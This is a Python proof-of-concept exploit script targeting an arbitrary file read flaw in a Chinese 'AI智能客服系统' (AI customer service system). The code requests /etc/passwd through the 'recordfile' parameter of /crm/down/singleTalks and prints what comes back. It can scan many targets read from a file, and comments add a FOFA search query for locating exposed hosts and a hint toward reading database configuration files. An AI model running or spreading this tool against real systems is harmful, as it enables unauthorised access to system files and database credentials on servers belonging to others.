#!/usr/bin/env python
# -*- conding:utf-8 -*-
# AI智能客服系统 任意文件读取漏洞
# fofa body="AI智能客服系统" && title="登录"
import requests
import argparse
import sys
import urllib3
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
           _____ 
    /\    |_   _|
   /  \     | |  
  / /\ \    | |  
 / ____ \  _| |_ 
/_/    \_\|_____|
                 
                                     
                                                                                                                                                                                                                                                                                                            
                                                                                        Author:Henry4E36
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        # ../config/database.php 读取数据库文件
        payload = self.url + "/crm/down/singleTalks?recordfile=/etc/passwd" 
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }  

        proxies = {
            "http": "127.0.0.1:8080"
        }      
        try:
            res = requests.get(url=payload, headers=headers, verify=False, timeout=5)
            if res.status_code == 200 and "root:" in res.text:
                print(res.text)
                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在任意文件读取漏洞!",color)
            else:
                print(f"[x] 目标系统: {self.url} 不存在任意文件读取漏洞")
        except Exception as e:
            print(f"[x] 目标系统: {self.url} 连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='AI智能客服系统 任意文件读取漏洞')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 read_file.py -u http://127.0.0.1\neg2:>>>python3 read_file.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
  
      

